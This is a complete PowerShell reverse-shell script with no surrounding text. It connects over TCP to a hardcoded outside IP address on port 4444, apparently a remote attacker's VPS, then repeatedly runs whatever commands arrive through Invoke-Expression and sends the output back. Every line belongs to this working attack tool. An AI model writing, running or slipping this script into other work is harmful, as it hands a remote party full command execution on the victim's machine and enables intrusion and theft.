$ip = "34.131.81.121"  # Update this if your VPS IP changes
$port = 4444
$client = New-Object Net.Sockets.TCPClient($ip,$port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $cmd = (iex $data 2>&1 | Out-String)
    $response = $cmd + "PS " + (pwd).Path + "> "
    $bytes_send = ([text.encoding]::ASCII).GetBytes($response)
    $stream.Write($bytes_send,0,$bytes_send.Length)
    $stream.Flush()
}
$client.Close()
